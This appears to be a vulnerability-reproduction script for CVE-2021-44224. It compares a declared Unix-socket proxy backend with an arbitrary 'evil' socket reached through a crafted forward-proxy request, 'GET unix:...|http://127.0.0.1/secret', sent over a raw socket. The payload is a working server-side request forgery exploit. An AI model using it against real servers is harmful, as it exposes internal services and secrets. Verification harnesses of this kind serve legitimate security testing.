#!/usr/bin/env bash
# CVE-2021-44224 分轴适配器：声明 UDS（合法业务）vs 任意 UDS（攻击面）
# 退出码：0=正常观测，3=环境问题
# 环境变量：QW9_BASE_URL QW9_OUT_DIR QW9_UDS_DIR QW9_EVIL_SOCK
set -u
BASE="${QW9_BASE_URL:?}" OUT="${QW9_OUT_DIR:?}"
UDS="${QW9_UDS_DIR:?}" EVIL="${QW9_EVIL_SOCK:?}"
mkdir -p "$OUT"

# 轴1（声明 UDS = 合法业务面）：经 ProxyPass 声明的 worker
code=$(curl -sS -o "$OUT/declared.body" -w '%{http_code}' \
  "$BASE/uds/secret" 2>"$OUT/declared.err") || code=000
grep -aq 'SECRET_FROM_declared' "$OUT/declared.body" 2>/dev/null && declared_udss_reached=1 || declared_udss_reached=0

# 轴2（任意 UDS = 攻击面）：forward proxy 绝对 URI，raw socket 防 curl 改写 URI
python3 - "$BASE" "$EVIL" > "$OUT/arbitrary_raw.txt" 2>&1 <<'PY' || true
import socket, sys
base, evil = sys.argv[1], sys.argv[2]
host = base.rsplit(":", 1)[0].replace("http://", "")
port = int(base.rsplit(":", 1)[1])
req = (f"GET unix:{evil}|http://127.0.0.1/secret HTTP/1.1\r\n"
       f"Host: 127.0.0.1\r\nConnection: close\r\n\r\n")
s = socket.create_connection((host, port), timeout=10)
s.sendall(req.encode())
data = b""
try:
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        data += chunk
except Exception:
    pass
sys.stdout.write(data.decode("latin1", "replace"))
PY
sleep 0.3
EVILLOG="$EVIL.log"
grep -aq '/secret' "$EVILLOG" 2>/dev/null && arbitrary_udss_reached=1 || arbitrary_udss_reached=0
cp -f "$EVILLOG" "$OUT/evil_backend.log" 2>/dev/null || true
cp -f "$UDS/declared.sock.log" "$OUT/declared_backend.log" 2>/dev/null || true

echo "declared_udss_reached=$declared_udss_reached"
echo "arbitrary_udss_reached=$arbitrary_udss_reached"
echo "declared_http_code=$code"
exit 0
